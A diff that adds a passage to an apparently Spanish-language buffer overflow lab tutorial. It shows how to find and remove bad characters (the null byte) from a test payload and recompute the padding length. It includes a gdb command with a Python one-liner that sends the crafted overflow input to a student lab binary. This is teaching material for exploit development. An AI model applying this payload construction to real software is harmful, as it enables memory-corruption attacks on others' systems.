@@ -377,9 +377,31 @@ Aquí reconocemos en qué dirección `\x55`comienza nuestro " ". A partir de aq
 <SNIP>
 ```
 
+Vemos dónde `\x55`termina nuestro " " y dónde `CHARS`comienza la variable. Pero si lo observamos de cerca, veremos que comienza con " `\x01`" en lugar de " `\x00`". Ya hemos visto la advertencia durante la ejecución de que `null byte`se ignoró el en nuestra entrada.
 
+Así que podemos tomar nota de este carácter, eliminarlo de nuestra variable `CHARS`y ajustar el número de nuestro " `\x55`".
 
+```shell-session
+# Substract the number of removed characters
+Buffer = "\x55" * (1040 - 255 - 4) = 781
 
+# "\x00" removed: 256 - 1 = 255 bytes
+ CHARS = "\x01\x02\x03...<SNIP>...\xfd\xfe\xff"
+ 
+   EIP = "\x66" * 4
+```
+
+#### Enviar CHARS - Sin byte nulo
+
+```shell-session
+(gdb) run $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
+
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
+Breakpoint 1, 0x56555551 in bowfunc ()
+```
 
 ## Generating Shellcode
 
